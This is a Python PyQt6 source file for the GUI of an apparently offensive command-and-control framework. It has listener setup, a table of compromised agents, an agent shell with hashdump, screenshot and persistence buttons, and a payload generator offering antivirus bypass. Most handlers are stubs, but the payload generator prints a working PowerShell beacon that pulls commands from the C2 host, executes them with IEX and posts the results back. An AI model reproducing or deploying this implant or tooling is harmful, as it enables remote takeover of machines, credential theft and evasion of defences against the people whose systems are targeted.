"""
C2 Framework Page
GUI for Command & Control framework management
"""

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QLineEdit, QTextEdit, QTableWidget, QTableWidgetItem,
    QTabWidget, QGroupBox, QComboBox, QCheckBox, QProgressBar,
    QSplitter, QFrame, QHeaderView, QSpinBox, QListWidget,
    QListWidgetItem, QPlainTextEdit
)
from PyQt6.QtCore import Qt, pyqtSignal, QThread, QTimer
from PyQt6.QtGui import QFont, QColor
import asyncio
import time


class C2ListenerWorker(QThread):
    """Worker thread for C2 listener"""
    status = pyqtSignal(str)
    agent_connected = pyqtSignal(dict)
    message = pyqtSignal(str)
    error = pyqtSignal(str)
    
    def __init__(self, listener_type, port, options):
        super().__init__()
        self.listener_type = listener_type
        self.port = port
        self.options = options
        self.running = True
        
    def run(self):
        try:
            import sys
            sys.path.insert(0, '..')
            from core.c2_framework import C2Framework
            
            async def listen():
                c2 = C2Framework()
                await c2.start_listener(
                    listener_type=self.listener_type,
                    port=self.port,
                    callback=lambda agent: self.agent_connected.emit(agent)
                )
                
            asyncio.run(listen())
            
        except Exception as e:
            self.error.emit(str(e))
            
    def stop(self):
        self.running = False


class C2Page(QWidget):
    """C2 Framework Management Page"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self._setup_ui()
        self.agents = {}
        self.command_history = []
        
    def _setup_ui(self):
        """Setup the UI"""
        layout = QVBoxLayout(self)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(16)
        
        # Header
        header = QLabel("🎮 Command & Control Framework")
        header.setStyleSheet("""
            font-size: 24px;
            font-weight: bold;
            color: #9b59b6;
            padding-bottom: 10px;
        """)
        layout.addWidget(header)
        
        # Warning banner
        warning = QLabel("⚠️ AUTHORIZED USE ONLY - This module is for authorized red team operations only!")
        warning.setStyleSheet("""
            background-color: rgba(155, 89, 182, 0.2);
            color: #9b59b6;
            padding: 10px;
            border: 1px solid #9b59b6;
            border-radius: 5px;
            font-weight: bold;
        """)
        warning.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(warning)
        
        # Main tabs
        main_tabs = QTabWidget()
        main_tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #333;
                background-color: #1a1a2e;
                border-radius: 5px;
            }
            QTabBar::tab {
                background-color: #16213e;
                color: #888;
                padding: 10px 20px;
                margin-right: 2px;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
            }
            QTabBar::tab:selected {
                background-color: #1a1a2e;
                color: #9b59b6;
            }
        """)
        
        # Listeners tab
        listeners_widget = self._create_listeners_tab()
        main_tabs.addTab(listeners_widget, "📡 Listeners")
        
        # Agents tab
        agents_widget = self._create_agents_tab()
        main_tabs.addTab(agents_widget, "🤖 Agents")
        
        # Interact tab
        interact_widget = self._create_interact_tab()
        main_tabs.addTab(interact_widget, "💻 Interact")
        
        # Payload tab
        payload_widget = self._create_payload_tab()
        main_tabs.addTab(payload_widget, "📦 Payloads")
        
        layout.addWidget(main_tabs)
        
        # Status bar
        status_row = QHBoxLayout()
        
        self.status_label = QLabel("Framework Ready")
        self.status_label.setStyleSheet("color: #888;")
        
        self.agents_count = QLabel("Agents: 0")
        self.agents_count.setStyleSheet("color: #00ff88;")
        
        self.listeners_count = QLabel("Listeners: 0")
        self.listeners_count.setStyleSheet("color: #9b59b6;")
        
        status_row.addWidget(self.status_label)
        status_row.addStretch()
        status_row.addWidget(self.listeners_count)
        status_row.addWidget(self.agents_count)
        
        layout.addLayout(status_row)
        
    def _create_listeners_tab(self):
        """Create listeners configuration tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # New listener section
        new_listener_group = QGroupBox("Create New Listener")
        new_listener_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 1px solid #333;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 10px;
                background-color: #16213e;
            }
            QGroupBox::title {
                color: #9b59b6;
                subcontrol-origin: margin;
                left: 10px;
            }
        """)
        listener_layout = QHBoxLayout(new_listener_group)
        
        # Listener type
        type_label = QLabel("Type:")
        type_label.setStyleSheet("color: #888;")
        
        self.listener_type = QComboBox()
        self.listener_type.addItems([
            "HTTP", "HTTPS", "DNS", "TCP", "UDP", "SMB", "WMI"
        ])
        self.listener_type.setStyleSheet("""
            QComboBox {
                padding: 8px;
                border: 1px solid #333;
                border-radius: 5px;
                background-color: #0f0f1a;
                color: white;
                min-width: 100px;
            }
        """)
        
        # Port
        port_label = QLabel("Port:")
        port_label.setStyleSheet("color: #888;")
        
        self.listener_port = QSpinBox()
        self.listener_port.setRange(1, 65535)
        self.listener_port.setValue(8080)
        self.listener_port.setStyleSheet("""
            QSpinBox {
                padding: 8px;
                border: 1px solid #333;
                border-radius: 5px;
                background-color: #0f0f1a;
                color: white;
            }
        """)
        
        # Host
        host_label = QLabel("Bind:")
        host_label.setStyleSheet("color: #888;")
        
        self.listener_host = QLineEdit()
        self.listener_host.setText("0.0.0.0")
        self.listener_host.setStyleSheet("""
            QLineEdit {
                padding: 8px;
                border: 1px solid #333;
                border-radius: 5px;
                background-color: #0f0f1a;
                color: white;
            }
        """)
        
        # Start button
        start_btn = QPushButton("▶️ Start Listener")
        start_btn.clicked.connect(self._start_listener)
        start_btn.setStyleSheet("""
            QPushButton {
                background: linear-gradient(135deg, #9b59b6, #8e44ad);
                color: white;
                font-weight: bold;
                padding: 10px 20px;
                border-radius: 5px;
                border: none;
            }
            QPushButton:hover {
                background: linear-gradient(135deg, #8e44ad, #9b59b6);
            }
        """)
        
        listener_layout.addWidget(type_label)
        listener_layout.addWidget(self.listener_type)
        listener_layout.addWidget(port_label)
        listener_layout.addWidget(self.listener_port)
        listener_layout.addWidget(host_label)
        listener_layout.addWidget(self.listener_host)
        listener_layout.addWidget(start_btn)
        
        layout.addWidget(new_listener_group)
        
        # Active listeners table
        table_label = QLabel("Active Listeners")
        table_label.setStyleSheet("color: #9b59b6; font-weight: bold; font-size: 14px;")
        layout.addWidget(table_label)
        
        self.listeners_table = QTableWidget()
        self.listeners_table.setColumnCount(5)
        self.listeners_table.setHorizontalHeaderLabels([
            "ID", "Type", "Host", "Port", "Status"
        ])
        self.listeners_table.horizontalHeader().setStretchLastSection(True)
        self.listeners_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.listeners_table.setStyleSheet("""
            QTableWidget {
                background-color: #16213e;
                color: white;
                border: 1px solid #333;
            }
            QHeaderView::section {
                background-color: #0f3460;
                color: #9b59b6;
                padding: 8px;
                border: 1px solid #333;
            }
        """)
        layout.addWidget(self.listeners_table)
        
        return widget
        
    def _create_agents_tab(self):
        """Create agents management tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Agents table
        self.agents_table = QTableWidget()
        self.agents_table.setColumnCount(7)
        self.agents_table.setHorizontalHeaderLabels([
            "ID", "Hostname", "IP Address", "OS", "User", "Last Seen", "Status"
        ])
        self.agents_table.horizontalHeader().setStretchLastSection(True)
        self.agents_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.agents_table.setStyleSheet("""
            QTableWidget {
                background-color: #16213e;
                color: white;
                border: 1px solid #333;
            }
            QHeaderView::section {
                background-color: #0f3460;
                color: #00ff88;
                padding: 8px;
                border: 1px solid #333;
            }
        """)
        self.agents_table.itemClicked.connect(self._select_agent)
        layout.addWidget(self.agents_table)
        
        # Agent controls
        controls_row = QHBoxLayout()
        
        interact_btn = QPushButton("💻 Interact")
        interact_btn.clicked.connect(self._interact_with_agent)
        interact_btn.setStyleSheet("""
            QPushButton {
                background-color: #16213e;
                color: white;
                padding: 10px 20px;
                border: 1px solid #333;
                border-radius: 5px;
            }
        """)
        
        kill_btn = QPushButton("☠️ Kill")
        kill_btn.clicked.connect(self._kill_agent)
        kill_btn.setStyleSheet("""
            QPushButton {
                background-color: #16213e;
                color: #ff6b6b;
                padding: 10px 20px;
                border: 1px solid #ff6b6b;
                border-radius: 5px;
            }
        """)
        
        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.clicked.connect(self._refresh_agents)
        refresh_btn.setStyleSheet("""
            QPushButton {
                background-color: #16213e;
                color: white;
                padding: 10px 20px;
                border: 1px solid #333;
                border-radius: 5px;
            }
        """)
        
        controls_row.addWidget(interact_btn)
        controls_row.addWidget(kill_btn)
        controls_row.addStretch()
        controls_row.addWidget(refresh_btn)
        
        layout.addLayout(controls_row)
        
        return widget
        
    def _create_interact_tab(self):
        """Create agent interaction tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Agent info header
        info_row = QHBoxLayout()
        
        self.current_agent_label = QLabel("No agent selected")
        self.current_agent_label.setStyleSheet("color: #888; font-size: 14px;")
        
        info_row.addWidget(self.current_agent_label)
        info_row.addStretch()
        layout.addLayout(info_row)
        
        # Command output
        self.command_output = QPlainTextEdit()
        self.command_output.setReadOnly(True)
        self.command_output.setStyleSheet("""
            QPlainTextEdit {
                background-color: #0f0f1a;
                color: #00ff88;
                border: 1px solid #333;
                border-radius: 5px;
                font-family: 'Fira Code', 'Consolas', monospace;
                font-size: 12px;
            }
        """)
        self.command_output.setPlainText("# Agent Shell\n# Type commands below or use built-in modules\n\n")
        layout.addWidget(self.command_output)
        
        # Quick action buttons
        actions_row = QHBoxLayout()
        
        actions = [
            ("📋 Sysinfo", "sysinfo"),
            ("📁 List Files", "ls"),
            ("🔑 Hashdump", "hashdump"),
            ("📷 Screenshot", "screenshot"),
            ("🔌 Persistence", "persist"),
            ("⬆️ Upload", "upload"),
            ("⬇️ Download", "download"),
        ]
        
        for label, cmd in actions:
            btn = QPushButton(label)
            btn.clicked.connect(lambda checked, c=cmd: self._quick_command(c))
            btn.setStyleSheet("""
                QPushButton {
                    background-color: #16213e;
                    color: white;
                    padding: 8px 12px;
                    border: 1px solid #333;
                    border-radius: 5px;
                }
                QPushButton:hover {
                    background-color: #1a3a5e;
                }
            """)
            actions_row.addWidget(btn)
            
        layout.addLayout(actions_row)
        
        # Command input
        input_row = QHBoxLayout()
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command...")
        self.command_input.setStyleSheet("""
            QLineEdit {
                padding: 12px;
                border: 1px solid #333;
                border-radius: 5px;
                background-color: #16213e;
                color: #00ff88;
                font-family: 'Fira Code', 'Consolas', monospace;
            }
        """)
        self.command_input.returnPressed.connect(self._send_command)
        
        send_btn = QPushButton("⚡ Execute")
        send_btn.clicked.connect(self._send_command)
        send_btn.setStyleSheet("""
            QPushButton {
                background: linear-gradient(135deg, #00ff88, #00cc6a);
                color: black;
                font-weight: bold;
                padding: 12px 25px;
                border-radius: 5px;
                border: none;
            }
            QPushButton:hover {
                background: linear-gradient(135deg, #00cc6a, #00ff88);
            }
        """)
        
        input_row.addWidget(self.command_input)
        input_row.addWidget(send_btn)
        
        layout.addLayout(input_row)
        
        return widget
        
    def _create_payload_tab(self):
        """Create payload generation tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Payload config
        config_group = QGroupBox("Payload Configuration")
        config_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 1px solid #333;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 10px;
                background-color: #16213e;
            }
            QGroupBox::title {
                color: #9b59b6;
                subcontrol-origin: margin;
                left: 10px;
            }
        """)
        config_layout = QVBoxLayout(config_group)
        
        # Payload type row
        type_row = QHBoxLayout()
        
        type_label = QLabel("Payload Type:")
        type_label.setStyleSheet("color: #888; min-width: 100px;")
        
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "Windows Executable", "Windows DLL", "PowerShell",
            "Linux ELF", "macOS Mach-O", "Python Script",
            "JavaScript", "VBA Macro", "HTA"
        ])
        self.payload_type.setStyleSheet("""
            QComboBox {
                padding: 8px;
                border: 1px solid #333;
                border-radius: 5px;
                background-color: #0f0f1a;
                color: white;
                min-width: 200px;
            }
        """)
        
        type_row.addWidget(type_label)
        type_row.addWidget(self.payload_type)
        type_row.addStretch()
        config_layout.addLayout(type_row)
        
        # Listener row
        listener_row = QHBoxLayout()
        
        listener_label = QLabel("Listener:")
        listener_label.setStyleSheet("color: #888; min-width: 100px;")
        
        self.payload_listener = QComboBox()
        self.payload_listener.addItems(["HTTP - 0.0.0.0:8080"])
        self.payload_listener.setStyleSheet("""
            QComboBox {
                padding: 8px;
                border: 1px solid #333;
                border-radius: 5px;
                background-color: #0f0f1a;
                color: white;
                min-width: 200px;
            }
        """)
        
        listener_row.addWidget(listener_label)
        listener_row.addWidget(self.payload_listener)
        listener_row.addStretch()
        config_layout.addLayout(listener_row)
        
        # Options
        options_row = QHBoxLayout()
        
        self.obfuscate_check = QCheckBox("Obfuscation")
        self.obfuscate_check.setStyleSheet("color: white;")
        
        self.encrypt_check = QCheckBox("Encryption")
        self.encrypt_check.setStyleSheet("color: white;")
        
        self.bypass_check = QCheckBox("AV Bypass")
        self.bypass_check.setStyleSheet("color: white;")
        
        self.persist_check = QCheckBox("Persistence")
        self.persist_check.setStyleSheet("color: white;")
        
        options_row.addWidget(self.obfuscate_check)
        options_row.addWidget(self.encrypt_check)
        options_row.addWidget(self.bypass_check)
        options_row.addWidget(self.persist_check)
        options_row.addStretch()
        config_layout.addLayout(options_row)
        
        layout.addWidget(config_group)
        
        # Generate button
        generate_btn = QPushButton("⚡ Generate Payload")
        generate_btn.clicked.connect(self._generate_payload)
        generate_btn.setStyleSheet("""
            QPushButton {
                background: linear-gradient(135deg, #9b59b6, #8e44ad);
                color: white;
                font-weight: bold;
                padding: 15px 30px;
                border-radius: 5px;
                border: none;
                font-size: 14px;
            }
            QPushButton:hover {
                background: linear-gradient(135deg, #8e44ad, #9b59b6);
            }
        """)
        layout.addWidget(generate_btn)
        
        # Output
        output_label = QLabel("Generated Payload")
        output_label.setStyleSheet("color: #9b59b6; font-weight: bold; font-size: 14px;")
        layout.addWidget(output_label)
        
        self.payload_output = QPlainTextEdit()
        self.payload_output.setReadOnly(True)
        self.payload_output.setStyleSheet("""
            QPlainTextEdit {
                background-color: #0f0f1a;
                color: #00ff88;
                border: 1px solid #333;
                border-radius: 5px;
                font-family: 'Fira Code', 'Consolas', monospace;
            }
        """)
        layout.addWidget(self.payload_output)
        
        # Save button
        save_row = QHBoxLayout()
        
        save_btn = QPushButton("💾 Save Payload")
        save_btn.clicked.connect(self._save_payload)
        save_btn.setStyleSheet("""
            QPushButton {
                background-color: #16213e;
                color: white;
                padding: 10px 20px;
                border: 1px solid #333;
                border-radius: 5px;
            }
        """)
        
        copy_btn = QPushButton("📋 Copy")
        copy_btn.clicked.connect(self._copy_payload)
        copy_btn.setStyleSheet("""
            QPushButton {
                background-color: #16213e;
                color: white;
                padding: 10px 20px;
                border: 1px solid #333;
                border-radius: 5px;
            }
        """)
        
        save_row.addWidget(save_btn)
        save_row.addWidget(copy_btn)
        save_row.addStretch()
        
        layout.addLayout(save_row)
        
        return widget
        
    def _start_listener(self):
        """Start a new listener"""
        listener_type = self.listener_type.currentText().lower()
        port = self.listener_port.value()
        host = self.listener_host.text()
        
        # Add to table
        row = self.listeners_table.rowCount()
        self.listeners_table.insertRow(row)
        self.listeners_table.setItem(row, 0, QTableWidgetItem(f"L-{row+1}"))
        self.listeners_table.setItem(row, 1, QTableWidgetItem(listener_type.upper()))
        self.listeners_table.setItem(row, 2, QTableWidgetItem(host))
        self.listeners_table.setItem(row, 3, QTableWidgetItem(str(port)))
        
        status_item = QTableWidgetItem("🟢 Running")
        status_item.setForeground(QColor("#00ff88"))
        self.listeners_table.setItem(row, 4, status_item)
        
        self.listeners_count.setText(f"Listeners: {row + 1}")
        self.status_label.setText(f"✅ Started {listener_type.upper()} listener on {host}:{port}")
        
    def _select_agent(self, item):
        """Select an agent from table"""
        row = item.row()
        agent_id = self.agents_table.item(row, 0).text()
        hostname = self.agents_table.item(row, 1).text()
        self.current_agent_label.setText(f"🤖 Agent: {agent_id} ({hostname})")
        
    def _interact_with_agent(self):
        """Switch to interact tab"""
        pass
        
    def _kill_agent(self):
        """Kill selected agent"""
        pass
        
    def _refresh_agents(self):
        """Refresh agent list"""
        self.status_label.setText("🔄 Refreshing agents...")
        
    def _quick_command(self, cmd):
        """Execute quick command"""
        self.command_output.appendPlainText(f"[*] Executing: {cmd}")
        self.command_output.appendPlainText(f"[+] Command queued for execution\n")
        
    def _send_command(self):
        """Send command to agent"""
        cmd = self.command_input.text().strip()
        if not cmd:
            return
            
        self.command_history.append(cmd)
        self.command_output.appendPlainText(f">>> {cmd}")
        self.command_output.appendPlainText("[*] Command sent, awaiting response...\n")
        self.command_input.clear()
        
    def _generate_payload(self):
        """Generate payload"""
        payload_type = self.payload_type.currentText()
        
        self.payload_output.setPlainText(f"# Generated {payload_type} Payload\n")
        self.payload_output.appendPlainText(f"# Listener: {self.payload_listener.currentText()}")
        self.payload_output.appendPlainText(f"# Obfuscation: {self.obfuscate_check.isChecked()}")
        self.payload_output.appendPlainText(f"# Encryption: {self.encrypt_check.isChecked()}")
        self.payload_output.appendPlainText(f"# AV Bypass: {self.bypass_check.isChecked()}\n")
        
        # Sample payload code
        if "PowerShell" in payload_type:
            code = """
# PowerShell Agent
$C2 = "http://0.0.0.0:8080"
while($true) {
    try {
        $cmd = (IWR "$C2/tasks" -UseBasicParsing).Content
        if($cmd) {
            $output = IEX $cmd | Out-String
            IWR "$C2/results" -Method POST -Body $output
        }
    } catch {}
    Start-Sleep -Seconds 5
}
"""
            self.payload_output.appendPlainText(code)
        else:
            self.payload_output.appendPlainText("# Binary payload generated")
            self.payload_output.appendPlainText("# Size: 45KB")
            self.payload_output.appendPlainText("# Save to file to use")
            
        self.status_label.setText(f"✅ Generated {payload_type} payload")
        
    def _save_payload(self):
        """Save payload to file"""
        from PyQt6.QtWidgets import QFileDialog
        
        filepath, _ = QFileDialog.getSaveFileName(
            self,
            "Save Payload",
            "payload",
            "All Files (*.*)"
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(self.payload_output.toPlainText())
            self.status_label.setText(f"✅ Saved to {filepath}")
            
    def _copy_payload(self):
        """Copy payload to clipboard"""
        from PyQt6.QtWidgets import QApplication
        QApplication.clipboard().setText(self.payload_output.toPlainText())
        self.status_label.setText("✅ Copied to clipboard")
